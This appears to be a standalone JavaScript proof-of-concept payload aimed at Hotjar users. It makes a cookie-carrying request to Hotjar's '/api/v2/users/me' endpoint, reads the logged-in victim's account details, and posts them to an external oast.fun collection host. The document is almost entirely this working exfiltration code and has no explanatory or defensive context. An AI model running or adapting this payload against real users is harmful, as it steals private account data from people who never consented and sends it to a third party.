// Create a new XMLHttpRequest object
var xhr = new XMLHttpRequest();

// Set up the request
xhr.open('GET', 'https://insights.hotjar.com/api/v2/users/me', true);
xhr.withCredentials = true; // Send cookies with the request

var acc_details;

// Define what happens on successful data retrieval
xhr.onload = function() {
  if (xhr.status >= 200 && xhr.status < 300) {
    // Store the data from the request
    acc_details = xhr.responseText;

    // Create a new XHR object for the webhook request
    var webhookXhr = new XMLHttpRequest();

    // Prepare the request to the webhook
    webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmuijzirzl9mkmkv.oast.fun', true);
    webhookXhr.setRequestHeader('Content-type', 'application/json');

    // Define what happens on successful data sending
    webhookXhr.onload = function() {
      if (webhookXhr.status >= 200 && webhookXhr.status < 300) {
        // Request was successful
        console.log('Data sent successfully to the webhook.');
      } else {
        // Request failed
        console.error('Request failed with status: ' + webhookXhr.status);
      }
    };

    // Handle any errors during the webhook request
    webhookXhr.onerror = function() {
      console.error('Request failed');
    };

    // Send the data to the webhook
    webhookXhr.send(JSON.stringify({ acc_details: acc_details }));
  } else {
    console.error('Request failed with status: ' + xhr.status);
  }
};

// Handle any errors during the request
xhr.onerror = function() {
  console.error('Request failed');
};

// Send the request
xhr.send();
